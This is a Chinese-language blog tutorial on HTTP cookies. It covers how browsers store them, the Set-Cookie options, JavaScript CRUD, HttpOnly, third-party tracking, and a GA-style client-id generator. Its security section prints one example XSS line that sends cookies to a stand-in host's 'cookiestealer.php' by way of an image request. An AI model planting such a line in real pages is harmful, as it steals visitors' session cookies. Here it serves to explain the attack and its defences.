---
title:  "All About Cookies"
category: JavaScript
---
最近在公司技术论坛写了一篇关于Cookies的博文，搬过来。顺便整理下以前博文里相关的内容。

本文内容基于这篇英文博客 [All about cookies](https://humanwhocodes.com/blog/2009/05/05/http-cookies-explained/)。

HTTP Cookie也简称为“Cookie”，根据wikipedia记载，最早是在1994年由Netscape网络浏览器开发者 [Lou Montulli]([https://en.wikipedia.org/wiki/Lou_Montulli](https://en.wikipedia.org/wiki/Lou_Montulli)) 提出并用于网络通信。

<!--more-->

## 它解决什么问题？
互联网应用早期最大的问题之一是如何管理状态。简单来说就是server无法分辨两个请求是否来自同一个浏览器。
当时的解决办法是在所请求的页面里插入一些token：使用表单的hidden field隐藏域，或者URL的query string。可想而知，这需要大量手动处理，且容易出错。
而当Lou Montulli在为MCI公司开发电子商务应用时，MCI也不希望自己的服务器必须保留部分事务状态。
So，Cookie的发明就是为了解决“如何记住用户信息”的问题。

简单总结Cookie的工作原理：
> 服务器或网页指示浏览器通过以纯文本文件形式，将用户状态信息存储在用户的计算机里，然后根据一定的规则将Cookie的值与后续每一个HTTP请求一起发回。

### Cookie 文件
上面提到，Cookie以文本文件的形式存储在用户的电脑里，那么这个文件具体在哪里？长什么样？

以 Firefox 为例，点击浏览器右上角“打开菜单”图标-》帮助-》故障排除信息-》应用程序概要-配置文件夹，点击“打开文件夹”，出现资源管理器界面，可以看到有一个叫 cookies.sqlite 的文件。如下图：
![17410e953f2742a1a15c7643af94b78a__20200408161214.png](http://tech.yuceyi.com/upload/17410e953f2742a1a15c7643af94b78a__20200408161214.png)

使用SQLite软件打开：
![3aeaeac69f4f4a24960c79261ea09f70__20200408161143.png](http://tech.yuceyi.com/upload/3aeaeac69f4f4a24960c79261ea09f70__20200408161143.png)

对比使用浏览器开发者工具看到的数据：
![cb3cf3d6c0764d00945a238f272af08c__20200408175757.png](http://tech.yuceyi.com/upload/cb3cf3d6c0764d00945a238f272af08c__20200408175757.png)

可知 Firefox 将 Cookie 数据的 value 等信息以**明文形式**存储。

再来看 Google Chrome，通过下图的文件路径，可以找到一个叫 Cookies 的文件，用代码编辑器打开，其内容并“不可读”：
![63aaf6c8920444cc9abd07b7a49b8716__15863303449865.png](http://tech.yuceyi.com/upload/63aaf6c8920444cc9abd07b7a49b8716__15863303449865.png)

有了 Firefox 的经验，果然使用SQLite软件可以将其打开。可以看到 Chrome 浏览器 Cookie 数据的 value 这一列为空：
![54fb8e9d1ba84b1f9e5f40800ed1f79d__20200408174401.png](http://tech.yuceyi.com/upload/54fb8e9d1ba84b1f9e5f40800ed1f79d__20200408174401.png)

原因是 Chrome 将 Cookie 数据的 value 值进行了加密，并将加密结果存储在 `encrypted_value` 字段里。点击可以看到类似上面代码编辑器直接打开看到的编码：
![50d5b84aceba4e29891b175f1c34fe5d__20200408165450.png](http://tech.yuceyi.com/upload/50d5b84aceba4e29891b175f1c34fe5d__20200408165450.png)

更多有关 Chrome Cookie 加密的内容，可以看这篇文章：[Chrome 80.X版本如何解密Cookies文件](https://cloud.tencent.com/developer/article/1598106)

## Cookie 的创建

服务端通过在HTTP response header里添加 `Set-Cookie` 标头设置Cookie。格式如下：

```
Set-Cookie: value[; expires=date][; domain=domain][; path=path][; secure]
```

+ 方括号里的内容可选
+ value值为 `name=value` 形式的字符串
+ value之后的每一个可选项均由“一个分号+一个空格”进行分隔

设置成功后，Cookie 的 value 将存储在名为 `Cookie` 的HTTP request header中，其值与Set-Cookie指定的value字符串完全相同；不对该值做进一步解释或编码。
设置成功后，Cookie 的 value 将存储在名为 `Cookie` 的HTTP request header中，其值与Set-Cookie指定的value字符串完全相同；不对该值做进一步解释或编码。
设置成功后，Cookie 的 value 将存储在名为 `Cookie` 的HTTP request header中，其值与 Set-Cookie 标头指定的 value 字符串完全相同；不对该值做进一步解释或编码。

### 实例

首先，打开浏览器开发者工具-》Network-》Doc。然后访问谷歌搜索结果页。

![2c0506ad9d264b2b9e7bb1c514c1551a_qingqiu1.png](http://tech.yuceyi.com/upload/2c0506ad9d264b2b9e7bb1c514c1551a_qingqiu1.png)

如上图所示。可以看到请求头 `cookie` 里包含名为“1P_JAR”的键名，值为 2020-04-24-02。
该http请求的响应头里同时有 `set-cookie` 字段，设置了相同键名的 Cookie 值为 2020-04-24-07，过期时间为 24-May-2020 07:09:08 GMT。

通过上面的截图也可看出，如果给定请求有多个cookie，则它们之间用分号和空格分隔。

接着，点击谷歌logo，回到谷歌默认搜索页，如下图所示：

![90e19ee86c3c491db5f99aec40d012a0_qingqiu2.png](http://tech.yuceyi.com/upload/90e19ee86c3c491db5f99aec40d012a0_qingqiu2.png)

可以看到在第二个http请求的request header里，名为“1P_JAR'”的Cookie值已更新为 2020-04-24-07。
这个 http 请求的response header中仍然有 `set-cookie` 字段，它没有改变“1P_JAR'”的值，但是设置其过期时间为 24-May-2020 07:10:01 GMT。

打开浏览器开发者工具-》Application-》Cookies，如下图所示：
![698fa60f0e91433193d90cf1b3cd4c11_devTool.png](http://tech.yuceyi.com/upload/698fa60f0e91433193d90cf1b3cd4c11_devTool.png)

可看到在 `.google.com` 域名下，有名为“1P_JAR'”的Cookie，其值为 2020-4-24-7，过期时间为 2020-05-24T07:10:02.000Z。与第二个请求response header中 `set-cookie` 所设置的信息几乎一致。

### expire
该选项用来表示不再发送指定 Cookie 到 server 的时间点，即 Cookie 在何时被浏览器删除。格式如：`Wdy, DD-Mon-YYYY HH:MM:SS GMT`。
缺省该选项，Cookie的生命周期为一个session。即当浏览器关闭时，Cookie 被删除。通常称这样的 Cookie 为 session cookie。

浏览器开发者工具里的效果如下：
![4d433fa475de4d93a8b19b7916bfc33c__20200407194920.png](http://tech.yuceyi.com/upload/4d433fa475de4d93a8b19b7916bfc33c__20200407194920.png)

### domain
该选项用来表示往哪个域名发送指定 Cookie。
默认情况下，其值为“设置了这个Cookie的页面的域名”。网站A设置的 Cookie c不会发送到网站B。

浏览器会对 domain 选项的值与发送请求页面的 hostname（主机名）进行尾部比较（即从字符串的末尾开始检查匹配），当前者与后者完全或部分匹配时，发送相应的HTTP `Cookie` header。

如下图所示：在 `domain=clubfactory.com` 下设置键名为 _ga，值为 GA1.2.1891328534.1586845521的 Cookie

![4a06c587b768457aaecb8356c31e2007__20200414143124.png](http://tech.yuceyi.com/upload/4a06c587b768457aaecb8356c31e2007__20200414143124.png)

![13bfa25525824bb792a550e5549216f3__15868457319106.png](http://tech.yuceyi.com/upload/13bfa25525824bb792a550e5549216f3__15868457319106.png)

<div style='text-align: center;'>CLUB FACTORY PC站</div>

![9fb350c7e7da4634b8d49cba902539b0__20200414142955.png](http://tech.yuceyi.com/upload/9fb350c7e7da4634b8d49cba902539b0__20200414142955.png)
<div style='text-align: center;'>Seller Central PC站</div>

![a57fa9d19c614945a6957c8220c51c3d__20200414142924.png](http://tech.yuceyi.com/upload/a57fa9d19c614945a6957c8220c51c3d__20200414142924.png)
<div style='text-align: center;'>广告系统PC站</div>

可以看到 seller.clubfactory.com、imp.seller.clubfactory.com 的页面都可以读取到 `.clubfactory.com` 下设置的这个Cookie值。

大多数需要登录的网站会在登录凭据通过验证后设置一个cookie，然后只要请求中存在该cookie并通过了验证，用户就可以自由导航到网站的所有部分。

实际应用中，通过将登录token设置到网站顶级（或二级）域名下，实现跨域登录。

### path
另一种控制何时发送Cookie header的方式是设置 path 选项。该选项表示在所请求的资源中必须存在指定的URL路径。

通过将path值的每个字符与请求URL的开始部分（相对路径）进行比较，如果字符匹配，则发送Cookie标头。

如：`path=/blog`，则 `/blog`，`/blogtech` 等任何以 `/blog` 开始的路径都匹配。注意，此比较只有在 domain 选项通过验证后才会进行。

该选项的**默认值**是发送 `set-cookie` header的 URL 路径。

### secure

最后一个选项 secure 不同于其他选项，只是一个标识，没有值。

设置了该选项的Cookie，只有在request使用了SSL和HTTPS协议时才会发送，以避免Cookie中较敏感的信息以明文传输可能遭到的破坏。实际应用中，任何机密的、敏感的信息都不应该使用Cookie存储或传输。

举例：在 http://tech.yuceyi.com/ 页面打开console，运行：

```js
document.cookie = "username=xue; secure";
```
在浏览器开发者工具里查看，该 cookie 没有生效。

而在 https://www.google.com/ 下执行上述代码，可以看到 cookie 立即生效。

缺省该选项，通过 HTTPS 连接的请求所设置的Cookie，会自动添加 secure。而在浏览器里**通过js设置的cookie不会自动添加**（需要明确设置该选项）。

## JS Cookie

### Create

使用 _document.cookie_ 属性创建、读取、更新、删除（CRUD） cookies。设置规则见上文。

    document.cookie = "username=Xue WU";

+ 可以添加一个 max-age 参数（max-age-in-seconds），最大有效期是多少。IE 不支持

#### 实例
在上述页面（[https://www.google.com/webhp?](https://www.google.com/webhp?)）浏览器开发者工具-》Console里依次运行以下代码：
```js
document.cookie = "username=vivi; domain=google.com"; // 1
document.cookie = "username=wu"; // 2
document.cookie = "username=xue; secure"; // 3
document.cookie = "username=wu; path=/search"; // 4
```
点击谷歌logo进入搜索结果页，查看上述代码的运行效果：

![64e4b51326c54199a89d16b8da6fe3b8__20200407202358.png](http://tech.yuceyi.com/upload/64e4b51326c54199a89d16b8da6fe3b8__20200407202358.png)

可以看到有3个名为username，而值不同的cookie包含在请求头部。1、3显然都生效了，而2和4具体是哪一个生效，还需要在Application模块确认：

![9d17523bdc4b4b6ca2495ceb4a3c4a62__20200407202443.png](http://tech.yuceyi.com/upload/9d17523bdc4b4b6ca2495ceb4a3c4a62__20200407202443.png)

![bc5a8526d34f426bba368d4e6c979829__20200407202526.png](http://tech.yuceyi.com/upload/bc5a8526d34f426bba368d4e6c979829__20200407202526.png)

通过上面两个截图，可知生效的是4，而3覆盖了2。

### Read

使用 _document.cookie_ 在**一个字符串中**返回当前页**所有** cookies. （比如: cookie1=value; cookie2=value; cookie3=value;）

如果想要找到指定 cookie 的值，需要自定义 JS 方法解析字符串查找。

+ 与发送到服务器的 Cookie 遵循相同的访问规则：页面必须与Cookie在相同的domain、path下（查看当前页域名 _location.hostname_ ，路径 _location.pathname_），拥有相同的安全等级(非 HttpOnly)
+ JS**无法读取 Cookie 的可选项**（domain、path、expiration date、secure标识）

### Change/Update

使用 `document.cookie = “name=value”`，name 是要更新的 cookie 名称，value 是新的值。

+ Cookie 有4个身份特征：name、domain、path、secure
+ 要改变一个Cookie的值，必选使用相同的 Cookie name，设置相同的domain、path
+ 不必每次都设置过期时间，因为 expires 不属于身份特征
+ 同名Cookie，如果可选项domain、path的值不同，结果不会覆盖原值，而是追加一个新的Cookie

### Delete

删除Cookie的方法很简单，只要将 _expires_ 的值**设置为一个已经过去的时间**。不需要特别指定 cookie 的值。

    document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC";

+ 这里的expiration时间以浏览器所运行的系统时间为检查标准

## Cookie的限制
为避免滥用，保护浏览器、服务器免受有害影响，Cookie有两种类型的限制：数量和大小。
网上有工具可以进行测试。为了支持大多数浏览器，建议每个domain设置Cookie数**不超过50个**,且每个domain下，所有Cookie大小加起来**不超过4093bytes**，约4kb。
超过大小限制的内容将被截断，不会发送到server。

## 安全问题

Cookie 以 plain text 在网络上传输，容易受到 packet sniffing 攻击。

解决方案：

+ 将 cookie 设为 session cookie
+ 即使提供“remember me”，也设置1-2周后过期
+ 上 https，只通过 SSL/TLS 发送cookie
+ 基于用户信息生成随机的 session key，如：username, IP address, time of login, etc.
+ 在执行高安全风险操作时 re-validate the user，如：修改密码前打开login页，要求用户再次登录
+ 敏感网站和系统设置短的 expiration 时间
+ 同时验证HTTP请求的 referrer

尽管请求第三方 JS 资源不会带上当前页的 Cookie，但脚本可以访问它们。

原因：页面上所有 JavaScript 都被视为运行在与当前网页具有相同域 domain、路径 path 和协议 protocol 上。这意味着来自另一个域的脚本能通过 document.cookie 获取当前页面的 cookie。
如： a 网站加载来自 b 网站的 JS，如果脚本里包含如下内容：

    (new Image()).src = "http://www.b.com/cookiestealer.php?cookie=" + cookie.domain;

相当于默默地偷取了所有访问 a 网站用户的 cookie。这种将第三方 JavaScript 注入网页而发生的攻击，称为跨站点脚本（XSS）攻击。

如果一个页面用户输入即输出，即网页输出没有对用户输入做任何过滤，那么当输入文本里通过 `<script></script>` 开闭标记，包含了与上面相同代码，则 cookie 同样可能被盗。

另一种跟 cookie 相关的攻击是 cross-site request forgery (CSRF) 跨站请求伪造。攻击者让浏览器作为一个 logged-in 用户向恶意网站发送请求，如向攻击者账户转账。使用与 XSS 相同的方法。

### HTTP-Only cookie

这种类型的 Cookie 作为一种安全措施，旨在防止通过 JavaScript 窃取 Cookie，造成的跨站点脚本（XSS）攻击。
服务端通过添加 `HttpOnly` 标识创建 HTTP-Only Cookie，格式如下：
```
Set-Cookie: name=Wu; HttpOnly
```

+ JS代码**不能读取**到拥有 `HttpOnly` 标识的Cookie
+ JS也**不能设置** HTTP-only cookies

#### 实例

如下图所示：打开谷歌搜索结果页，在浏览器开发者工具-》Application-》Cookies里可以看到，当前页一共有4个cookies，其中3个都设置了 HttpOnly。

![5b759b4edae149dcb18999a68caffab7__20200414163558.png](http://tech.yuceyi.com/upload/5b759b4edae149dcb18999a68caffab7__20200414163558.png)

在浏览器开发者工具-》Console里运行以下代码，结果仅返回4个Cookies中没有设置HttpOnly标识的Cookie值。

![3516fb64d5764e798c3b9c81ec33ff6c__15868531938682.png](http://tech.yuceyi.com/upload/3516fb64d5764e798c3b9c81ec33ff6c__15868531938682.png)

### 第三方 cookie

html 允许引入其他网络资源，如通过 link、script、iframe 标签。由于 cookie 的限制，a 网站通过上述标签拉取 b 网站的资源时，不会包含 a 网站的 cookie，但是 b 网站很可能在响应里返回它自己的 cookie。因为同源策略，a 网站不能 access b 网站发来的 cookie，反之亦然。然而双方的 cookies 都存在 client 那里。这种情况我们称 b 网站设置了第三方 cookie。

当 b 网站接收到的 HTTP Referer 头部表明的请求来自 a 网站，b 网站可以发布特定的 cookieA 来标识 a 网站。如果随后相同的资源被 c 网站加载，而 cookieA 与请求一起发来，那么可以确定访问了 a 网站的人也访问了 c 网站。这就是常见的在线广告策略。这样的 cookie 也成为 **tracking cookie**。

### 实例

设置cookie

```js
function setCookie(cname, cvalue, exdays, domain) {
  const d = new Date();
  d.setTime(d.getTime() + (exdays*24*60*60*1000));
  let expires = "expires="+ d.toUTCString();
  document.cookie = `${cname}=${cvalue};${expires};domain=${domain};SameSite=None;Secure;path=/`;
}
```

仿照GA生成client id，存储到顶级域名下

```js
function ClientIDGenerator () {
  const hd = function() { return Math.round(2147483647 * Math.random()) };
  const La = function(a) { var b = 1, c; if (a) for (b = 0, c = a.length - 1; 0 <= c; c--) { var d = a.charCodeAt(c); b = (b << 6 & 268435455) + d + (d << 14); d = b & 266338304; b = 0 != d ? b ^ d >> 21 : b } return b };
  const ra = function() {
    for (var a = window.navigator.userAgent + (document.cookie ? document.cookie : "") + (document.referrer ? document.referrer : ""), b = a.length, c = window.history.length; 0 < c;)a += c-- ^ b++; return [hd() ^ La(a) & 2147483647, Math.round((new Date).getTime() / 1E3)].join(".")
  };

  const val = ra();
  const topLevelDomain = window.location.hostname.split('.').slice(-2).join('.');
  setCookie('_cid', val, 365*2, topLevelDomain);
  return val
}
```